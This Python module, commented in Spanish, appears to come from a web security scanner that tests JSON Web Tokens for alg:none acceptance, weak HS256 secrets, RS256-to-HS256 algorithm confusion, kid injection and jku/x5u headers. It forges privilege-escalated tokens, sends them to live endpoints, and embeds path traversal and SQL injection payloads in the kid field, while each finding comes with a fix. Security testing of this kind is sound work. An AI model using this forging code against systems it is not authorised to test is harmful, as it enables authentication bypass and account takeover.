"""
modules/jwt_scan.py — Detección y análisis de JSON Web Tokens (JWT).

Ataques implementados:
  1. alg:none bypass
  2. Secreto débil (fuerza bruta offline HS256)
  3. RS256 → HS256 algorithm confusion (usa clave pública como secreto HMAC)
  4. kid SQL/Path Traversal injection
  5. jku / x5u header injection (JWKS URL spoofing)

Anti-FP:
  - Fuerza bruta offline — sin tráfico extra.
  - Algorithm confusion solo reporta si el token forjado recibe respuesta distinta a 401.
  - kid injection: baseline diff para descartar error genérico.
"""

from __future__ import annotations

import asyncio
import base64
import hmac
import hashlib
import json
import re
from urllib.parse import urlparse, urljoin

from utils.http import AsyncHTTPClient
from utils.vuln import Vuln, make_vuln
from config import JWT_WEAK_SECRETS


_JWT_PATTERN = re.compile(r'(eyJ[A-Za-z0-9_-]+)\.(eyJ[A-Za-z0-9_-]+)\.([A-Za-z0-9_-]*)')

_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/jwks.json",
    "/jwks",
    "/auth/jwks",
    "/api/auth/jwks",
    "/.well-known/openid-configuration",
]

_AUTH_PROBE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/me", "/user", "/profile", "/account",
    "/api/v1/me", "/api/v1/user",
]


# ─── Base64url helpers ────────────────────────────────────────────────────────

def _b64d(data: str) -> bytes:
    rem = len(data) % 4
    if rem:
        data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data)


def _b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


# ─── JWK → PEM (manual, sin cryptography) ────────────────────────────────────

def _asn1_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return b"\x81" + bytes([n])
    return b"\x82" + bytes([n >> 8, n & 0xFF])


def _asn1_int(raw: bytes) -> bytes:
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return b"\x02" + _asn1_len(len(raw)) + raw


def _jwk_rsa_to_pem(jwk: dict) -> bytes | None:
    """Convierte JWK RSA a PEM SubjectPublicKeyInfo (sin deps externos)."""
    try:
        n = _b64d(jwk["n"])
        e = _b64d(jwk["e"])
        n_der = _asn1_int(n)
        e_der = _asn1_int(e)
        seq_inner = n_der + e_der
        seq = b"\x30" + _asn1_len(len(seq_inner)) + seq_inner
        # OID 1.2.840.113549.1.1.1 (rsaEncryption) + NULL
        oid = b"\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00"
        bs_body = b"\x00" + seq
        bs = b"\x03" + _asn1_len(len(bs_body)) + bs_body
        spki_body = oid + bs
        spki = b"\x30" + _asn1_len(len(spki_body)) + spki_body
        b64 = base64.b64encode(spki)
        lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
        return b"-----BEGIN PUBLIC KEY-----\n" + b"\n".join(lines) + b"\n-----END PUBLIC KEY-----\n"
    except Exception:
        return None


# ─── Fetch JWKS public key ────────────────────────────────────────────────────

async def _fetch_public_key(client: AsyncHTTPClient, base: str) -> tuple[bytes | None, str]:
    """Devuelve (pem_bytes, jwks_url) o (None, '')."""
    for path in _JWKS_PATHS:
        url = f"{base}{path}"
        try:
            resp = await client.get(url, lax_ssl=True, body_limit=65536)
            if not resp or resp.status not in (200, 201):
                continue
            data = json.loads(resp.text)
            # openid-configuration puede tener jwks_uri
            if "jwks_uri" in data:
                r2 = await client.get(data["jwks_uri"], lax_ssl=True, body_limit=65536)
                if r2 and r2.status == 200:
                    data = json.loads(r2.text)
                    url = data.get("jwks_uri", url)
            for key in data.get("keys", []):
                if key.get("kty") == "RSA":
                    pem = _jwk_rsa_to_pem(key)
                    if pem:
                        return pem, url
        except Exception:
            continue
    return None, ""


# ─── Obtener status de referencia (sin token) ────────────────────────────────

async def _probe_auth_status(client: AsyncHTTPClient, base: str, probe_path: str) -> int:
    """Status sin token de autenticación."""
    try:
        r = await client.get(f"{base}{probe_path}", lax_ssl=True, body_limit=4096)
        return r.status if r else 0
    except Exception:
        return 0


# ─── Entry point ─────────────────────────────────────────────────────────────

async def run(
    client:    AsyncHTTPClient,
    url:       str,
    body_text: str | None = None,
    headers:   dict | None = None,
) -> list[Vuln]:
    vulns: list[Vuln] = []

    # Fuentes de búsqueda de JWTs
    search_text = body_text or ""
    if headers:
        for v in headers.values():
            search_text += f" {v}"

    # Intentar obtener un JWT del endpoint de login u otros comunes
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    matches = _JWT_PATTERN.findall(search_text)
    unique_tokens: set[str] = set()
    for m in matches:
        unique_tokens.add(f"{m[0]}.{m[1]}.{m[2]}")

    if not unique_tokens:
        return vulns

    # Pre-fetch clave pública (una sola vez para todos los RS256 tokens)
    public_key_pem: bytes | None = None
    jwks_url: str = ""

    for token in unique_tokens:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        header_b64, payload_b64, sig_b64 = parts

        try:
            hdr = json.loads(_b64d(header_b64))
            pay = json.loads(_b64d(payload_b64))
        except Exception:
            continue

        alg = hdr.get("alg", "").upper()

        # ── 1. alg: none ─────────────────────────────────────────────────────
        if alg == "NONE":
            vulns.append(make_vuln(
                title       = "JWT 'alg: none' — Firma omitida",
                severity    = "CRITICAL",
                cvss        = 9.1,
                category    = "Broken Authentication",
                description = (
                    "El servidor acepta JWTs con alg:none. Un atacante puede forjar "
                    "tokens con cualquier payload (admin:true) sin clave."
                ),
                evidence    = f"Header: {json.dumps(hdr)}\nPayload: {json.dumps(pay)}",
                fix         = "Rechazar tokens con alg:none. Usar whitelist de algoritmos aceptados.",
                ref         = "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                module      = "jwt_scan",
                cwe         = "CWE-347",
                owasp       = "A07:2021",
            ))

        # ── 2. Secreto débil HS256 ────────────────────────────────────────────
        if alg == "HS256":
            msg = f"{header_b64}.{payload_b64}".encode()
            target_sig = _b64d(sig_b64)
            cracked = None
            for secret in JWT_WEAK_SECRETS:
                if hmac.new(secret.encode(), msg, hashlib.sha256).digest() == target_sig:
                    cracked = secret
                    break
            if cracked:
                vulns.append(make_vuln(
                    title       = "JWT Secreto Débil Crackeado (HS256)",
                    severity    = "CRITICAL",
                    cvss        = 9.8,
                    category    = "Broken Authentication",
                    description = "El JWT usa un secreto trivial. Un atacante puede firmar tokens arbitrarios.",
                    evidence    = (
                        f"Secreto crackeado: '{cracked}'\n"
                        f"Payload: {json.dumps(pay)}\n"
                        f"Forjar token: use PyJWT con secret='{cracked}'"
                    ),
                    fix         = "Generar secreto >= 256 bits con CSPRNG. Rotar inmediatamente.",
                    ref         = "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
                    module      = "jwt_scan",
                    cwe         = "CWE-521",
                    owasp       = "A07:2021",
                ))

        # ── 3. RS256 → HS256 Algorithm Confusion ─────────────────────────────
        if alg == "RS256":
            if public_key_pem is None:
                public_key_pem, jwks_url = await _fetch_public_key(client, base)

            if public_key_pem:
                vuln = await _test_alg_confusion(
                    client, base, hdr, pay, header_b64, payload_b64, public_key_pem, jwks_url
                )
                if vuln:
                    vulns.append(vuln)

        # ── 4. kid SQL / Path Traversal injection ─────────────────────────────
        kid = hdr.get("kid")
        if kid:
            vuln = await _test_kid_injection(client, url, hdr, pay, header_b64, payload_b64, kid)
            if vuln:
                vulns.append(vuln)

        # ── 5. jku / x5u header injection ────────────────────────────────────
        for field in ("jku", "x5u"):
            val = hdr.get(field)
            if val:
                vulns.append(make_vuln(
                    title       = f"JWT '{field}' Header Injection",
                    severity    = "CRITICAL",
                    cvss        = 9.0,
                    category    = "Broken Authentication",
                    description = (
                        f"El JWT contiene el campo '{field}' que apunta a una URL externa "
                        f"({val}). Si el servidor descarga y usa esa clave, un atacante "
                        "puede servir su propia clave pública y firmar tokens arbitrarios."
                    ),
                    evidence    = f"Header JWT: {json.dumps(hdr)}\n{field}: {val}",
                    fix         = (
                        f"Eliminar soporte para '{field}' en la librería JWT. "
                        "Usar JWKS interno fijo, no URLs controladas por el cliente."
                    ),
                    ref         = "https://portswigger.net/web-security/jwt/algorithm-confusion",
                    module      = "jwt_scan",
                    cwe         = "CWE-290",
                    owasp       = "A07:2021",
                ))

    return vulns


# ─── RS256 → HS256 confusion ──────────────────────────────────────────────────

async def _test_alg_confusion(
    client:     AsyncHTTPClient,
    base:       str,
    orig_hdr:   dict,
    orig_pay:   dict,
    hdr_b64:    str,
    pay_b64:    str,
    pubkey_pem: bytes,
    jwks_url:   str,
) -> Vuln | None:
    """
    Forja un token HS256 usando la clave pública RSA como secreto HMAC.
    Prueba contra endpoints /api/me, /api/user, etc.
    Reporta solo si el forjado recibe status != 401/403 donde el inválido sí los recibe.
    """
    # Forjar header HS256
    new_hdr = {"alg": "HS256", "typ": "JWT"}
    nh_b64  = _b64e(json.dumps(new_hdr, separators=(",", ":")).encode())

    # Intentar escalada en el payload
    test_pay = dict(orig_pay)
    for f in ("role", "admin", "is_admin", "isAdmin", "scope", "type", "group", "privilege"):
        if f in test_pay:
            v = test_pay[f]
            test_pay[f] = "admin" if isinstance(v, str) else True

    np_b64 = _b64e(json.dumps(test_pay, separators=(",", ":")).encode())
    msg     = f"{nh_b64}.{np_b64}".encode()
    sig     = hmac.new(pubkey_pem, msg, hashlib.sha256).digest()
    forged  = f"{nh_b64}.{np_b64}.{_b64e(sig)}"

    # Token inválido de referencia (firma aleatoria)
    invalid = f"{nh_b64}.{np_b64}.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    sem = asyncio.Semaphore(4)

    async def probe(path: str) -> tuple[int, int]:
        """(status_forged, status_invalid)"""
        headers_forged  = {"Authorization": f"Bearer {forged}"}
        headers_invalid = {"Authorization": f"Bearer {invalid}"}
        async with sem:
            try:
                rf = await client.get(f"{base}{path}", extra_headers=headers_forged,  lax_ssl=True, body_limit=4096)
                ri = await client.get(f"{base}{path}", extra_headers=headers_invalid, lax_ssl=True, body_limit=4096)
                sf = rf.status if rf else 0
                si = ri.status if ri else 0
                return sf, si
            except Exception:
                return 0, 0

    results = await asyncio.gather(*[probe(p) for p in _AUTH_PROBE_PATHS])

    for path, (sf, si) in zip(_AUTH_PROBE_PATHS, results):
        # Vulnerable: forjado pasa (200-299) pero inválido es rechazado (401/403)
        if sf in range(200, 300) and si in (401, 403):
            return make_vuln(
                title       = "JWT Algorithm Confusion: RS256 → HS256",
                severity    = "CRITICAL",
                cvss        = 9.8,
                category    = "Broken Authentication",
                description = (
                    "El servidor acepta tokens HS256 firmados con la clave pública RSA "
                    "como secreto HMAC — ataque de confusión de algoritmo confirmado. "
                    "Un atacante puede forjar tokens con cualquier payload (admin, otro usuario)."
                ),
                evidence    = (
                    f"JWKS: {jwks_url}\n"
                    f"Token forjado (HS256, pubkey como secret): {forged[:80]}...\n"
                    f"Endpoint: {base}{path}\n"
                    f"Respuesta forjado: HTTP {sf} | Inválido: HTTP {si}\n"
                    f"Payload escalado: {json.dumps(test_pay)}"
                ),
                fix         = (
                    "Usar whitelist de algoritmos: rechazar HS* si la configuración espera RS*. "
                    "En librerías JWT: especificar el algoritmo explícitamente al verificar. "
                    "PyJWT: jwt.decode(token, pubkey, algorithms=['RS256']). "
                    "Nunca permitir que el header alg controle qué algoritmo se usa."
                ),
                ref         = "https://portswigger.net/web-security/jwt/algorithm-confusion",
                module      = "jwt_scan",
                cwe         = "CWE-327",
                owasp       = "A07:2021",
            )
    return None


# ─── kid SQL / Path Traversal ─────────────────────────────────────────────────

async def _test_kid_injection(
    client:  AsyncHTTPClient,
    url:     str,
    orig_hdr: dict,
    orig_pay: dict,
    hdr_b64:  str,
    pay_b64:  str,
    kid:      str,
) -> Vuln | None:
    """
    kid SQL: firma con secreto vacío e inyecta kid="... UNION SELECT 'x'--"
    kid Path Traversal: kid="../../dev/null" → firma con vacío
    Anti-FP: baseline diff — si el endpoint base ya devuelve error, skip.
    """
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Baseline: request sin token
    try:
        baseline = await client.get(url, lax_ssl=True, body_limit=4096)
        baseline_status = baseline.status if baseline else 0
    except Exception:
        baseline_status = 0

    if baseline_status in (401, 403, 0):
        pass  # normal — el endpoint requiere auth, seguir

    # Construir tokens maliciosos con kid inyectado
    empty_secret = b""
    payloads_kid = [
        ("../../../dev/null",             "Path Traversal"),
        ("' UNION SELECT 'x' --",         "SQL Injection"),
        ("../../etc/passwd",              "Path Traversal (passwd)"),
        ("x' OR '1'='1",                  "SQL Injection (OR bypass)"),
    ]

    for kid_payload, attack_type in payloads_kid:
        try:
            new_hdr = dict(orig_hdr)
            new_hdr["kid"] = kid_payload
            if new_hdr.get("alg", "").upper() == "RS256":
                new_hdr["alg"] = "HS256"

            nh_b64 = _b64e(json.dumps(new_hdr, separators=(",", ":")).encode())
            np_b64 = pay_b64
            msg    = f"{nh_b64}.{np_b64}".encode()
            sig    = hmac.new(empty_secret, msg, hashlib.sha256).digest()
            forged = f"{nh_b64}.{np_b64}.{_b64e(sig)}"

            probe_paths = _AUTH_PROBE_PATHS[:4]
            for path in probe_paths:
                r = await client.get(
                    f"{base}{path}",
                    extra_headers={"Authorization": f"Bearer {forged}"},
                    lax_ssl=True,
                    body_limit=4096,
                )
                if r and r.status in range(200, 300):
                    return make_vuln(
                        title       = f"JWT kid {attack_type} — Token Forjado Aceptado",
                        severity    = "CRITICAL",
                        cvss        = 9.5,
                        category    = "Broken Authentication",
                        description = (
                            f"El campo 'kid' del JWT header es vulnerable a {attack_type}. "
                            "Se forjó un token con kid malicioso y firma vacía — el servidor lo aceptó. "
                            "Un atacante puede autenticarse como cualquier usuario."
                        ),
                        evidence    = (
                            f"kid original: {kid}\n"
                            f"kid inyectado: {kid_payload}\n"
                            f"Secreto HMAC usado: '' (vacío)\n"
                            f"Token forjado aceptado en: {base}{path} (HTTP {r.status})"
                        ),
                        fix         = (
                            "Nunca usar el campo 'kid' directamente en queries SQL o paths de filesystem. "
                            "Validar y sanitizar el kid. Usar un mapa estático de kid → clave."
                        ),
                        ref         = "https://portswigger.net/web-security/jwt",
                        module      = "jwt_scan",
                        cwe         = "CWE-89",
                        owasp       = "A03:2021",
                    )
        except Exception:
            continue

    return None
